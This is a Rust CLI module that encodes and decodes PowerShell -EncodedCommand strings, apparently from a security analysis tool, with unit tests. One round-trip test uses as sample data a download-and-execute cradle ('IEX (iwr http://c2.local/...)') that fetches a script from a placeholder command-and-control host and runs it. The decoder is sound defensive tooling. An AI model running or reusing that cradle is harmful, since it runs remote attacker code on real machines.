use std::borrow::Cow;
use std::path::PathBuf;

use base64::alphabet::STANDARD;
use base64::engine::{DecodePaddingMode, GeneralPurpose, GeneralPurposeConfig};
use base64::{DecodeError, Engine};
use clap::Subcommand;

use crate::cli::bytes_from_file_or_stdin;

const B64: GeneralPurpose = GeneralPurpose::new(
    &STANDARD,
    GeneralPurposeConfig::new().with_decode_padding_mode(DecodePaddingMode::Indifferent),
);

#[derive(Debug, Subcommand)]
pub(in crate::cli) enum PowerShellCommand {
    /// PowerShell `-EncodedCommand` decoding
    #[command(arg_required_else_help = true)]
    Decode {
        /// File to decode, or `-` to read from stdin
        file: PathBuf,
    },
    ///  PowerShell `-EncodedCommand` encoding
    #[command(arg_required_else_help = true)]
    Encode {
        /// File to encode, or `-` to read from stdin
        file: PathBuf,
    },
}

impl PowerShellCommand {
    pub(super) fn run(self) -> Result<(), Box<dyn std::error::Error>> {
        match self {
            Self::Decode { file } => {
                let bytes: Vec<u8> = bytes_from_file_or_stdin(file)?;
                let data: Cow<str> = String::from_utf8_lossy(&bytes);
                let decoded: String = decode(&data)?;
                println!("{decoded}");
                Ok(())
            }
            Self::Encode { file } => {
                let bytes: Vec<u8> = bytes_from_file_or_stdin(file)?;
                let data: Cow<str> = String::from_utf8_lossy(&bytes);
                let encoded: String = encode(&data);
                println!("{encoded}");
                Ok(())
            }
        }
    }
}

fn encode(bytes: &str) -> String {
    let utf16le: Vec<u8> = bytes.encode_utf16().flat_map(u16::to_le_bytes).collect();
    B64.encode(utf16le)
}

fn decode(b64: &str) -> Result<String, DecodeError> {
    let cleaned: String = b64
        .chars()
        .filter(|c| !c.is_whitespace() && !matches!(c, '"' | '\''))
        .collect();
    let bytes: Vec<u8> = B64.decode(cleaned.as_bytes())?;
    let len: usize = bytes.len() - bytes.len() % 2;
    let units: Vec<u16> = bytes[..len]
        .chunks(2)
        .map(|p| u16::from_le_bytes([p[0], p[1]]))
        .collect();
    Ok(String::from_utf16_lossy(&units))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn known_vector() {
        assert_eq!(encode("whoami"), "dwBoAG8AYQBtAGkA");
    }

    #[test]
    fn roundtrip() {
        let cmd = "IEX (iwr http://c2.local/s.ps) -UseBasicParsing";
        assert_eq!(decode(&encode(cmd)).unwrap(), cmd);
    }

    #[test]
    fn decode_lenient() {
        assert_eq!(decode("\"dwBoAG8AYQBtAGkA\"\n").unwrap(), "whoami");
    }
}
